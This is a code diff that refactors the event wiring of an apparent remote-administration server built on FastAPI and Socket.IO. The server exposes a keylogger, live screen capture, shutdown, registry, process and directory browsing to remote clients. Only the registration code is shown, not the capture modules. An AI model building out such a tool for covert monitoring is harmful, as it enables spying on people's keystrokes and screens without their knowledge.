@@ -12,11 +12,18 @@ import src.server.shutdown_logout_server as sl
 
 PORT = 5656
 
-app = FastAPI()
+# Use this to register FastAPI routes
+api = FastAPI()
 
+# Use this to register Socket.IO events
 sio = socketio.AsyncServer(async_mode="asgi", cors_allowed_origins="*", logger=True)
 
-app = socketio.ASGIApp(sio)
+app = socketio.ASGIApp(sio, api)
+
+
+# @api.get("/")
+# async def index():
+#     return "Hello World"
 
 
 @sio.on("KEYLOG:start")
@@ -25,40 +32,23 @@ def keylogger(sid):
     return
 
 
-@sio.on("SD_LO:start")
-def shutdown_logout(sid):
-    sl.shutdown_logout(sio)
-    return
+# Register shutdown and logout events
+sl.callbacks(sio)
 
+# Register MAC address events
+mac.callbacks(sio)
 
-@sio.on("MAC:start")
-async def mac_address(sid):
-    await mac.mac_address(sio)
-    return
+# Register app process events
+ap.callbacks(sio)
 
+# Register live screen events
+lss.callbacks(sio)
 
-@sio.on("APP_PRO:start")
-def app_process(sid):
-    ap.app_process(sio)
-    return
+# Register directory tree events
+dt.callbacks(sio)
 
-
-@sio.on("LIVESCREEN:start")
-async def live_screen(sid):
-    await lss.capture_screen(sio)
-    return
-
-
-@sio.on("DIRECTORY:start")
-def directory_tree(sid):
-    dt.directory(sio)
-    return
-
-
-@sio.on("REGISTRY:start")
-def registry(sid):
-    rs.registry(sio)
-    return
+# Register registry events
+rs.callbacks(sio)
 
 
 @sio.on("QUIT")
